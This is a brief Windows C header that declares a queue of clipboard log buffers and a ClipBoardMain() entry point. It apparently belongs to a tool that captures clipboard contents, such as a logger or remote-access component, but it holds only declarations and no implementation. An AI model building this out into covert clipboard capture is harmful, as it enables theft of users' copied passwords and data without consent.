#include <Windows.h>


#define MAX_CLIPBOARD_QUEUE 1000

typedef struct 
{
	DWORD dwSize;
	LPBYTE lpBuffer;
} CLIPBOARD_LOGS, *LPCLIPBOARD_LOGS;

extern CLIPBOARD_LOGS lpClipboardLogs[MAX_CLIPBOARD_QUEUE];

VOID ClipBoardMain();

